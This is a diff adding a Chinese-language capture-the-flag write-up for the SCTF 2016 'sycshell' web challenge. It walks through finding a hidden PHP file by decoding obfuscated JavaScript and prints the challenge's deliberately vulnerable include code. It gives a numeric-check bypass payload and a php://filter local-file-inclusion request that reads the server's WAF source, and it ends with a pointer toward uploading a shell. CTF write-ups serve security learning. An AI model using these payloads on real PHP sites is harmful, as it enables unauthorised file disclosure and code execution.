@@ -1,0 +1,75 @@
+http://58.213.63.27:61180/
+
+1. 修改host，访问：  
+
+<!-- 内部系统资料：http://sycshell.sycsec.com:61180/ -->
+
+#SCTF2016  
+
+58.213.63.27    sycshell.sycsec.com
+
+访问: http://sycshell.sycsec.com:61180/ 
+
+2. jother编码解密  
+
+https://github.com/dNetGuru/JSUNFuck/releases
+
+PS E:\pentest\tools\jother_decode> .\JSUNFuck.exe .\test.txt
+if(1==2){var tip="/W0Ca1N1CaiBuDa0/read.php?f=index";}else{alert(/No Tip/);})()
+
+http://sycshell.sycsec.com:61180/W0Ca1N1CaiBuDa0/read.php?f=index
+
+得到源码。
+
+ <?php
+show_source(__FILE__);
+$pass = @$_GET['pass'];
+$a = "syclover";
+
+strlen($pass) > 15 ? die("Don't Hack me!") : "";
+
+if(!is_numeric($pass) || preg_match('/0(x)?|-|\+|\s|^(\.|\d).*$/i',$pass)){
+    die('error');
+}
+
+if($pass == 1 &&  $a[$pass] === "s"){
+    $file = isset($_GET['f']) ? $_GET['f'].'.php' : 'index.php';
+    @include $file;
+}
+
+
+3. 代码审计,绕过限制
+
+绕过方法值得学习：
+http://sycshell.sycsec.com:61180/W0Ca1N1CaiBuDa0/read.php?f=index&&pass=%0b.1e1
+
+https://www.sco4x0.com/archives/sctf-2016.html
+
+http://zone.wooyun.org/content/23961
+http://zone.wooyun.org/content/24075
+
+查看phpinfo；
+
+http://58.213.63.27:61180/phpinfo.php
+
+auto_prepend_file	/home/wwwroot/waf.php	/home/wwwroot/waf.php
+
+读取waf.php 文件内容：
+http://sycshell.sycsec.com:61180/W0Ca1N1CaiBuDa0/read.php?f=php://filter/convert.base64-encode/resource=/home/wwwroot/waf&&pass=%0B.1e1
+
+<?php
+if(isset($_GET['f']) && preg_match("/zip|phar/",$_GET['f'],$array)){
+	die("SycWaf: Don't Hack me!");
+}
+
+4. phpinfo + lfi 上传shell
+
+
+http://www.freebuf.com/articles/web/79830.html
+https://www.91ri.org/11298.html
+
+
+
+
+
+
